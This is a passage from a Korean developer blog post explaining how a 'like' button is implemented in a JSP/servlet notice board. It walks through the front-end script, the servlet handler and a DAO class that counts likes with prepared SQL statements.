<span class="err"> </span> <span class="err"> </span> <span class="nx">heart</span> <span class="o">=</span> <span class="nx">json</span><span class="p">.</span><span class="nx">result</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">if</span><span class="p">(</span><span class="nx">heart</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">heart</span><span class="dl">'</span><span class="p">).</span><span class="nx">className</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">heart</span><span class="dl">'</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">heart</span><span class="dl">'</span><span class="p">).</span><span class="nx">className</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">heart-no</span><span class="dl">'</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">like-count</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">json</span><span class="p">.</span><span class="nx">likecount</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h4 id="notice_boardjsp">notice_board.jsp</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 수를 게시글 목록에 표시해 준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6d094a02-64d8-4ba4-8eca-b740a83b736b" alt="Pasted image 20230604001438" /></li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;span</span> <span class="na">style=</span><span class="s">"color:#922024;"</span><span class="nt">&gt;&lt;%=</span><span class="n">n</span><span class="o">.</span><span class="na">getLikes</span><span class="o">()</span> <span class="nt">%&gt;</span> likes<span class="nt">&lt;/span&gt;&lt;br&gt;</span>
</code></pre></div></div>

<h3 id="좋아요-버튼-servlet">좋아요 버튼 Servlet</h3>

<h4 id="mainpagejava">MainPage.java</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 요청이 오면 servlet에서 <code class="language-plaintext highlighter-rouge">좋아요</code>를 db 테이블에 추가하거나 삭제한다.</li>
  <li>JSON 형태로 응답을 한다.</li>
  <li>응답 데이터에는 현재 사용자의 <code class="language-plaintext highlighter-rouge">좋아요</code> 여부와 게시글의 <code class="language-plaintext highlighter-rouge">좋아요</code> 수가 포함된다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeBoardLikes</span> <span class="o">=</span> <span class="s">"/main_page/notice_board/likes"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 좋아요 설정 및 해제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"POST"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardLikes</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">re</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// true : 좋아요 한 다음 갯수 알아보기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// false : 좋아요 취소한 다음 갯수 알아보기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// confirm : 오직 좋아요 갯수만 알아보기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">method</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"like"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeId</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"pageid"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// like 검사, false 좋아요 해제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!(</span><span class="n">method</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"true"</span><span class="o">)</span> <span class="o">||</span> <span class="n">method</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"false"</span><span class="o">)</span> <span class="o">||</span> <span class="n">method</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"confirm"</span><span class="o">))){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">re</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\""</span><span class="o">+</span><span class="n">re</span><span class="o">+</span><span class="s">"\", \"likecount\":\""</span><span class="o">+</span><span class="n">cnt</span><span class="o">+</span><span class="s">"\"}"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 존재하는 게시글인지 확인하기 아니면 fail! false 좋아요 해제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">noticeSid</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeSid</span> <span class="o">=</span> <span class="nc">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">noticeId</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeDAO</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NoticeBoardDAO</span><span class="o">(</span><span class="n">getServletContext</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">notice</span> <span class="o">=</span> <span class="n">noticeDAO</span><span class="o">.</span><span class="na">getNotice</span><span class="o">(</span><span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">notice</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">re</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\""</span><span class="o">+</span><span class="n">re</span><span class="o">+</span><span class="s">"\", \"likecount\":\""</span><span class="o">+</span><span class="n">cnt</span><span class="o">+</span><span class="s">"\"}"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 사용자 정보 가지고 오기</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">user</span> <span class="o">=</span> <span class="o">(</span><span class="nc">User</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeLikeDAO</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NoticeLikeDAO</span><span class="o">(</span><span class="n">getServletContext</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 1. method 에 따른 계산 시작! 좋아요 증가 or 좋아요 삭제 등등</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"true"</span><span class="o">)){</span> <span class="c1">// 좋아요 추가</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeLikeDAO</span><span class="o">.</span><span class="na">addLike</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getSid</span><span class="o">(),</span> <span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"false"</span><span class="o">))</span> <span class="o">{</span> <span class="c1">// 좋아요 삭제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeLikeDAO</span><span class="o">.</span><span class="na">deleteLike</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getSid</span><span class="o">(),</span> <span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="c1">//method 가 confirm 일 때는 pass</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 2. 사용자 좋아요 싫어요 여부 확인</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">isLikeUser</span> <span class="o">=</span> <span class="n">noticeLikeDAO</span><span class="o">.</span><span class="na">isUserLike</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getSid</span><span class="o">(),</span> <span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">re</span> <span class="o">=</span> <span class="n">isLikeUser</span><span class="o">;</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 3. 게시글 좋아요 갯수 카운트</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">cnt</span> <span class="o">=</span> <span class="n">noticeLikeDAO</span><span class="o">.</span><span class="na">getCount</span><span class="o">(</span><span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"좋아용 "</span><span class="o">+</span><span class="n">method</span><span class="o">+</span><span class="s">" "</span><span class="o">+</span><span class="n">noticeId</span><span class="o">+</span><span class="s">"  like count : "</span><span class="o">+</span><span class="n">cnt</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\""</span><span class="o">+</span><span class="n">re</span><span class="o">+</span><span class="s">"\", \"likecount\":\""</span><span class="o">+</span><span class="n">cnt</span><span class="o">+</span><span class="s">"\"}"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<h4 id="noticelikedaojava">NoticeLikeDAO.java</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">likes</code> 테이블에 쉽게 접속하기위한 클래스이다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NoticeLikeDAO</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="nc">String</span> <span class="n">tableName</span> <span class="o">=</span> <span class="s">"likes"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="nc">Connection</span> <span class="n">conn</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="nc">DBConnection</span> <span class="n">dbConn</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nf">NoticeLikeDAO</span><span class="o">(</span><span class="nc">ServletContext</span> <span class="n">context</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">dbConn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DBConnection</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">"noticeBoard"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="kt">void</span> <span class="nf">Connection</span><span class="o">(){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">conn</span> <span class="o">=</span> <span class="n">dbConn</span><span class="o">.</span><span class="na">connectDB</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="kt">void</span> <span class="nf">Close</span><span class="o">(){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">conn</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>현재 게시물의 <code class="language-plaintext highlighter-rouge">좋아요</code> 수 구하기.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">long</span> <span class="nf">getCount</span><span class="o">(</span><span class="kt">long</span> <span class="n">noticeSid</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">likes</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"select count(*) from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where notice_board_sid=?"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">result</span> <span class="o">=</span> <span class="n">pstmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">next</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">likes</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">likes</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">finally</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">likes</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>사용자 좋아요를 클릭했는지 안했는지를 판단한다.</li>
  <li>true 이면 현재 사용자는 클릭한 상태이다.</li>
  <li>false 이면 현재 사용자는 클릭을 안한 상태이다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err"> </span> <span class="err"> </span> <span class="c1">// 사용자 좋아요 했는지 안했는지 판단한다.</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isUserLike</span><span class="o">(</span><span class="kt">long</span> <span class="n">userSid</span><span class="o">,</span><span class="kt">long</span> <span class="n">noticeSid</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"select count(*) from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where user_sid=? and notice_board_sid=?"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">userSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">result</span> <span class="o">=</span> <span class="n">pstmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">next</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">cnt</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
